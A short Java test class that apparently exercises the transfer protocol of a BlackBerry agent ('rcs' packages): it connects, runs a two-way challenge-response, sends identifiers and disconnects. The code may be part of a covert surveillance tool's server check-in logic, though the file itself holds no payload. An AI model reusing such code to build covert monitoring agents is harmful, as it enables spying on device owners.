package com.ht.tests.accessor;

import com.ht.rcs.blackberry.transfer.Command;
import com.ht.rcs.blackberry.transfer.Proto;
import com.ht.rcs.blackberry.transfer.ProtocolException;
import com.ht.rcs.blackberry.transfer.Transfer;
import com.ht.rcs.blackberry.utils.Check;

public class TransferAccessor extends Transfer {

	public TransferAccessor()
	{
		super();
	}

	public void ChallengeTest() throws ProtocolException {
		boolean ret = connect();
		if(!ret)
		{
			debug.error("cannot connect");
		}
		
		debug.trace("send challange");
		sendChallenge();
		getResponse();
		
		debug.trace("get challange");
		getChallenge();
		sendResponse();
		
		debug.trace("both challange OK");		
		// identificazione
		sendIds();
		
		debug.trace("disconnect");
		disconnect();
	}
}
